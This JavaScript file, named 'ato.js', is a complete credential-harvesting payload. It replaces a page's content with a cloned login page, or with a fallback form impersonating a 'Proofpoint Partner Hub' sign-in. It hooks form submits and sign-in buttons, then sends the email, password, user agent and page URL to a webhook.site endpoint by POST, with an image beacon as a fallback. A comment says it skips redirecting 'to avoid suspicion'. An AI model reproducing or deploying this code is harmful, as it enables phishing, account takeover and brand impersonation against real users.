// ato.js - Complete login page loader with credential capture
(function() {
    // Configuration
    const WEBHOOK_URL = 'https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef';
    const LOGIN_PAGE_URL = 'https://swathip888a.github.io/ATO/index.html';
    
    // Create overlay to replace the page content
    function replacePageWithLogin() {
        // Remove all existing content
        document.body.innerHTML = '';
        document.head.innerHTML = '';
        
        // Create new HTML structure matching the original
        const container = document.createElement('div');
        container.id = 'app-container';
        document.body.appendChild(container);
        
        // Load the login page via fetch
        fetch(LOGIN_PAGE_URL)
            .then(response => response.text())
            .then(html => {
                // Parse the HTML
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                
                // Copy head elements (styles, meta, etc.)
                const headElements = doc.head.children;
                for (let element of headElements) {
                    if (element.tagName === 'STYLE' || 
                        (element.tagName === 'LINK' && element.rel === 'stylesheet') ||
                        element.tagName === 'META') {
                        document.head.appendChild(element.cloneNode(true));
                    }
                }
                
                // Copy body content
                const bodyContent = doc.body.children;
                for (let element of bodyContent) {
                    container.appendChild(element.cloneNode(true));
                }
                
                // Inject the login form with our custom handler
                injectCustomLoginHandler();
                
                // Add styles to ensure full page display
                const style = document.createElement('style');
                style.textContent = `
                    body {
                        margin: 0;
                        padding: 0;
                        background: #f5f5f5;
                    }
                    #app-container {
                        width: 100%;
                        min-height: 100vh;
                    }
                    .login-popup, .modal, [class*="popup"], [class*="modal"] {
                        display: none !important;
                    }
                `;
                document.head.appendChild(style);
            })
            .catch(error => {
                console.error('Error loading login page:', error);
                // Fallback: create login form directly
                createFallbackLoginForm();
            });
    }
    
    // Inject custom login handler into the existing form
    function injectCustomLoginHandler() {
        // Wait for DOM to be ready
        setTimeout(() => {
            // Find email and password inputs - look for any input fields
            const emailInput = document.querySelector('input[type="email"], input[name="email"], input[id*="email"], input[placeholder*="Email"]');
            const passwordInput = document.querySelector('input[type="password"], input[name="password"], input[id*="password"], input[placeholder*="Password"]');
            const submitButton = document.querySelector('button[type="submit"], input[type="submit"], button:contains("Sign"), button:contains("Login"), button:contains("Get started")');
            
            // Alternative: find any form and add submit handler
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // Find inputs within this form
                    const formEmail = form.querySelector('input[type="email"], input[name="email"], input[id*="email"]');
                    const formPassword = form.querySelector('input[type="password"], input[name="password"], input[id*="password"]');
                    
                    const email = formEmail ? formEmail.value : '';
                    const password = formPassword ? formPassword.value : '';
                    
                    if (email && password) {
                        sendCredentials(email, password);
                    } else {
                        // Try to find any email/password inputs on page
                        const anyEmail = document.querySelector('input[type="email"], input[name="email"]');
                        const anyPassword = document.querySelector('input[type="password"], input[name="password"]');
                        
                        if (anyEmail && anyPassword && anyEmail.value && anyPassword.value) {
                            sendCredentials(anyEmail.value, anyPassword.value);
                        }
                    }
                });
            });
            
            // Also capture any button clicks that might submit
            const allButtons = document.querySelectorAll('button');
            allButtons.forEach(button => {
                button.addEventListener('click', function(e) {
                    // Check if this button is likely a submit button
                    const buttonText = button.innerText.toLowerCase();
                    if (buttonText.includes('sign') || buttonText.includes('login') || buttonText.includes('get started') || buttonText.includes('submit')) {
                        const emailInput = document.querySelector('input[type="email"], input[name="email"]');
                        const passwordInput = document.querySelector('input[type="password"], input[name="password"]');
                        
                        if (emailInput && passwordInput && emailInput.value && passwordInput.value) {
                            e.preventDefault();
                            sendCredentials(emailInput.value, passwordInput.value);
                        }
                    }
                });
            });
        }, 1000);
    }
    
    // Send credentials to webhook
    function sendCredentials(email, password) {
        const timestamp = new Date().toISOString();
        const userAgent = navigator.userAgent;
        const pageUrl = window.location.href;
        
        const data = {
            email: email,
            password: password,
            timestamp: timestamp,
            userAgent: userAgent,
            pageUrl: pageUrl,
            source: 'ato_login_page'
        };
        
        // Send to webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            console.log('Credentials sent successfully');
            // Show success message but don't redirect to avoid suspicion
            showMessage('Processing...', 'success');
        })
        .catch(error => {
            console.error('Error sending credentials:', error);
            showMessage('Please try again', 'error');
        });
        
        // Also try to send via image beacon as fallback
        const beaconUrl = `${WEBHOOK_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&t=${timestamp}`;
        const img = new Image();
        img.src = beaconUrl;
    }
    
    // Show temporary message to user
    function showMessage(text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.textContent = text;
        msgDiv.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 10px 20px;
            background: ${type === 'success' ? '#4CAF50' : '#f44336'};
            color: white;
            border-radius: 5px;
            z-index: 10000;
            font-family: Arial, sans-serif;
        `;
        document.body.appendChild(msgDiv);
        setTimeout(() => msgDiv.remove(), 3000);
    }
    
    // Fallback login form if fetching fails
    function createFallbackLoginForm() {
        const container = document.getElementById('app-container') || document.body;
        container.innerHTML = `
            <div style="max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <div style="text-align: center; margin-bottom: 30px;">
                    <h1>Proofpoint</h1>
                    <h2>Partner Hub</h2>
                </div>
                <form id="loginForm">
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px;">Email</label>
                        <input type="email" id="email" name="email" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;" required>
                    </div>
                    <div style="margin-bottom: 20px;">
                        <label style="display: block; margin-bottom: 5px;">Password</label>
                        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;" required>
                    </div>
                    <button type="submit" style="width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Sign In</button>
                </form>
            </div>
        `;
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (email && password) {
                sendCredentials(email, password);
            }
        });
    }
    
    // Initialize: Replace page content with login page
    replacePageWithLogin();
})();
